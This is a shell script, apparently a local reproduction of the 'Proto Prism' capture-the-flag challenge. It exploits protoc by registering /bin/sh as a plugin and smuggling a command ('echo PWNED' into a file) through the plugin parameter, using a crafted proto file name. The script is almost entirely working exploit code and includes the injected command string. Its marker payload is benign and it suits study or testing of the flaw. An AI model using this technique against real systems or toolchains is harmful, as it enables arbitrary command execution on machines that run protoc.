#!/bin/sh
# Proto Prism: local /bin/sh plugin test, no CTF server required.
# Historically reproduced with protoc 25.1 and protoc 29.3.
# Usage: sh local_repro.sh /path/to/protoc
set -eu
P="${1:?usage: local_repro.sh /path/to/protoc}"
case "$P" in /*) ;; *) P="$(cd "$(dirname "$P")" && pwd)/$(basename "$P")";; esac
W="$(mktemp -d)"
trap 'rm -rf "$W"' EXIT
mkdir -p "$W/protos"
cd "$W"
cat > protos/service.proto <<'EOF'
syntax = "proto3";
package prism;
message R { string v = 1; }
message S { string v = 1; }
service P { rpc Ping(R) returns (S); }
EOF
NAME='#AAAAAAAAAAAAAAAAAA
BBBBBBBBB.proto'
printf 'syntax = "proto3";\npackage attack;\nmessage Trigger { string v = 1; }\n' > "protos/$NAME"
PARAM=';echo PWNED > '"$W"'/pwned.txt;exit 0;#'
printf -- '--plugin=protoc-gen-x=/bin/sh\n--x_out=%s:.\n' "$PARAM" > args.proto
"$P" -Iprotos -o out.pb '@args.proto' "protos/$NAME" service.proto
echo "protoc rc=$?"
echo "--- pwned.txt:"
cat pwned.txt
